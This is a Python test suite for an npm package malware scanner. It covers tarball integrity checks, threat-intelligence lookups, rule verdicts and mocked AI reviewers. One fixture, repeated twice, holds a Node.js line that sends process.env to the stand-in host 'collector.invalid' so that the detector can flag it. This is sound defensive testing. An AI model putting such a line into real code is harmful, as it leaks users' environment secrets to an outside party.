import base64
import hashlib
from datetime import UTC, datetime

import httpx
from helpers import make_packument, make_tgz, manifest_json

from pkgguard_analyzer.ai.config import AIMode
from pkgguard_analyzer.ai.reviewer import ReviewerOutput
from pkgguard_analyzer.analyze import analyze, parse_spec
from pkgguard_analyzer.intel import OSV_QUERY_URL, SAFEDEP_QUERY_URL
from pkgguard_analyzer.schema import AIVerdict, DecidedBy, ReviewMode, ScanStatus, Verdict

NOW = datetime(2026, 9, 17, tzinfo=UTC)
TARBALL_URL = "https://registry.npmjs.org/demo-pkg/-/demo-pkg-1.0.0.tgz"


def mock_client(tarball: bytes, integrity: str, osv: dict | None = None, safedep: dict | None = None) -> httpx.Client:
    packument = make_packument(integrity=integrity, tarball=TARBALL_URL)

    def handler(request: httpx.Request) -> httpx.Response:
        url = str(request.url)
        if url == "https://registry.npmjs.org/demo-pkg":
            return httpx.Response(200, json=packument)
        if url == TARBALL_URL:
            return httpx.Response(200, content=tarball)
        if url == OSV_QUERY_URL:
            return httpx.Response(200, json=osv or {})
        if url == SAFEDEP_QUERY_URL:
            return httpx.Response(200, json=safedep or {"report": {"inference": {"isMalware": False}}})
        return httpx.Response(404)

    return httpx.Client(transport=httpx.MockTransport(handler))


def sri(data: bytes) -> str:
    return "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()


def test_clean_package_end_to_end(tmp_path):
    tarball = make_tgz({"package/package.json": manifest_json(), "package/index.js": "module.exports = 1"})
    result = analyze("demo-pkg", out_dir=tmp_path, client=mock_client(tarball, sri(tarball)), now=NOW)
    assert result.record.status == ScanStatus.COMPLETE
    assert result.record.verdict == Verdict.SAFE
    assert result.record.sha256 == hashlib.sha256(tarball).hexdigest()
    assert result.report.metadata["fileCount"] == 2
    assert (tmp_path / "demo-pkg" / "1.0.0" / "files" / "index.js").exists()


def test_known_malicious_package(tmp_path):
    tarball = make_tgz({"package/package.json": manifest_json()})
    client = mock_client(tarball, sri(tarball), osv={"vulns": [{"id": "MAL-2026-1"}]})
    result = analyze("demo-pkg", "1.0.0", out_dir=tmp_path, client=client, now=NOW)
    assert result.record.verdict == Verdict.MALICIOUS


def test_tampered_tarball_fails_scan(tmp_path):
    tarball = make_tgz({"package/package.json": manifest_json()})
    result = analyze("demo-pkg", out_dir=tmp_path, client=mock_client(tarball, sri(b"something else")), now=NOW)
    assert result.record.status == ScanStatus.FAILED
    assert "integrity" in result.record.failure_reason
    assert result.report is None


def test_intel_outage_does_not_stop_scan(tmp_path):
    tarball = make_tgz({"package/package.json": manifest_json()})
    packument = make_packument(integrity=sri(tarball), tarball=TARBALL_URL)

    def handler(request):
        url = str(request.url)
        if url == "https://registry.npmjs.org/demo-pkg":
            return httpx.Response(200, json=packument)
        if url == TARBALL_URL:
            return httpx.Response(200, content=tarball)
        return httpx.Response(503)

    result = analyze("demo-pkg", out_dir=tmp_path, client=httpx.Client(transport=httpx.MockTransport(handler)), now=NOW)
    assert result.record.status == ScanStatus.COMPLETE
    assert "error" in result.report.intel["osv"]


def test_parse_spec():
    assert parse_spec("express") == ("express", None)
    assert parse_spec("express@4.18.2") == ("express", "4.18.2")
    assert parse_spec("@babel/core") == ("@babel/core", None)
    assert parse_spec("@babel/core@7.24.0") == ("@babel/core", "7.24.0")


def test_suspicious_code_changes_verdict(tmp_path):
    tarball = make_tgz(
        {
            "package/package.json": manifest_json(),
            "package/index.js": 'const h = require("https"); h.request({host: "collector.invalid"}).end(JSON.stringify(process.env));',
        }
    )
    result = analyze("demo-pkg", out_dir=tmp_path, client=mock_client(tarball, sri(tarball)), now=NOW)
    assert result.record.verdict == Verdict.SUSPICIOUS
    assert any(f.rule_id == "code.exfiltration" for f in result.report.findings)
    assert result.report.code_scan["filesScanned"] == 1


class FakeReviewer:
    model_id = "fake-model"

    def __init__(self, verdict="SAFE", confidence="HIGH", error=None):
        self.output = AIVerdict(verdict=verdict, confidence=confidence, summary=f"AI says {verdict}", reasoning="read the code")
        self.error = error
        self.modes = []

    def review(self, workspace, task, mode):
        self.modes.append(mode)
        if self.error:
            raise self.error
        workspace.read_file("index.js")
        return ReviewerOutput(self.output, 100, 20)


EXFIL_CODE = 'const h = require("https"); h.request({host: "collector.invalid"}).end(JSON.stringify(process.env));'


def test_ai_quick_look_runs_on_clean_package(tmp_path):
    tarball = make_tgz({"package/package.json": manifest_json(), "package/index.js": "module.exports = 1"})
    reviewer = FakeReviewer("SAFE", "HIGH")
    result = analyze("demo-pkg", out_dir=tmp_path, client=mock_client(tarball, sri(tarball)), now=NOW, reviewer=reviewer, ai_mode=AIMode.ALWAYS)
    assert reviewer.modes == [ReviewMode.QUICK_LOOK]
    assert result.record.decided_by == DecidedBy.AI
    assert result.record.model == "fake-model"
    assert result.report.ai_review.files_read == ["index.js"]


def test_flagged_mode_skips_clean_package(tmp_path):
    tarball = make_tgz({"package/package.json": manifest_json(), "package/index.js": "module.exports = 1"})
    reviewer = FakeReviewer()
    result = analyze("demo-pkg", out_dir=tmp_path, client=mock_client(tarball, sri(tarball)), now=NOW, reviewer=reviewer, ai_mode=AIMode.FLAGGED)
    assert reviewer.modes == []
    assert result.report.ai_review is None and result.record.model is None


def test_ai_confirms_malware(tmp_path):
    tarball = make_tgz({"package/package.json": manifest_json(), "package/index.js": EXFIL_CODE})
    reviewer = FakeReviewer("MALICIOUS", "HIGH")
    result = analyze("demo-pkg", out_dir=tmp_path, client=mock_client(tarball, sri(tarball)), now=NOW, reviewer=reviewer, ai_mode=AIMode.ALWAYS)
    assert reviewer.modes == [ReviewMode.DEEP_DIVE]
    assert (result.record.verdict, result.record.decided_by) == (Verdict.MALICIOUS, DecidedBy.AI)


def test_ai_failure_falls_back_to_rules(tmp_path):
    tarball = make_tgz({"package/package.json": manifest_json(), "package/index.js": EXFIL_CODE})
    reviewer = FakeReviewer(error=ConnectionError("provider down"))
    result = analyze("demo-pkg", out_dir=tmp_path, client=mock_client(tarball, sri(tarball)), now=NOW, reviewer=reviewer, ai_mode=AIMode.ALWAYS)
    assert result.record.status == ScanStatus.COMPLETE
    assert result.record.verdict == Verdict.SUSPICIOUS
    assert result.record.ai_failed is True
    assert "provider down" in result.report.ai_error


class FakeAuditor:
    model_id = "coordinator-model"

    def __init__(self):
        self.calls = 0

    def audit(self, files_dir, report):
        from pkgguard_analyzer.schema import AIReview

        self.calls += 1
        return AIReview(verdict="SAFE", confidence="HIGH", summary="audited everything", reasoning="r", model=self.model_id, mode="full_audit", duration_seconds=1.0), None


def test_full_audit_replaces_quick_review(tmp_path):
    tarball = make_tgz({"package/package.json": manifest_json(), "package/index.js": "module.exports = 1"})
    auditor, reviewer = FakeAuditor(), FakeReviewer()
    result = analyze("demo-pkg", out_dir=tmp_path, client=mock_client(tarball, sri(tarball)), now=NOW, reviewer=reviewer, ai_mode=AIMode.ALWAYS, auditor=auditor)
    assert auditor.calls == 1 and reviewer.modes == []
    assert result.report.ai_review.mode == ReviewMode.FULL_AUDIT
    assert result.record.model == "coordinator-model"


def test_report_stores_behavior_hashes_settings_timings_and_flags(tmp_path):
    tarball = make_tgz({"package/package.json": manifest_json(), "package/index.js": EXFIL_CODE})
    result = analyze("demo-pkg", out_dir=tmp_path, client=mock_client(tarball, sri(tarball)), now=NOW)
    report, record = result.report, result.record

    assert report.behavior.reads_all_env and report.behavior.network_modules == ["https"]
    assert [h.path for h in report.file_hashes] == ["index.js", "package.json"]
    assert report.settings.ai == {"mode": "off"} and report.settings.rules_hash
    assert report.timings.total_seconds >= report.timings.code_scan_seconds >= 0
    assert report.review_flags.needs_human_review  # SUSPICIOUS verdict
    assert record.needs_review and record.settings_hash == report.settings.settings_hash
    assert record.ioc_count == len(report.iocs)
    top = report.code_issues[0]
    assert top.file == "index.js" and top.line_start == 1 and top.excerpt.lines[0].highlighted
